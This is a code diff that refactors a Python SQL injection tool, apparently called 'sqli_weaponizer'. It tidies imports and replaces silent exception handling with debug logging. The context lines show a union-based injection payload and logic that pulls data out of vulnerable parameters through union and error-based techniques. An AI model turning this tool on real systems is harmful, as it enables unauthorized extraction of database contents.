@@ -1,5 +1,10 @@
+import re
 from typing import Optional, Dict
 import requests
+
+from tools.log_utils import get_logger
+
+logger = get_logger("sqli_weaponizer")
 
 EXTRACT_PAYLOADS = [
     ("UNION SELECT 1,2,3-- ", 1),
@@ -36,8 +41,8 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                     result["data"].append({"source": "extraction", "value": potential[:100]})
                     result["type"] = "union"
                     break
-        except:
-            pass
+        except Exception as e:
+            logger.debug("sqli_weaponizer union: %s", e)
         if result["vulnerable"]:
             break
 
@@ -52,12 +57,7 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                     result["data"].append({"source": "error_based", "value": m.group(1)[:100]})
                     result["type"] = "error_based"
                     break
-            except:
-                pass
-
-    import re
+            except Exception as e:
+                logger.debug("sqli_weaponizer error: %s", e)
 
     return result
-
-
-import re
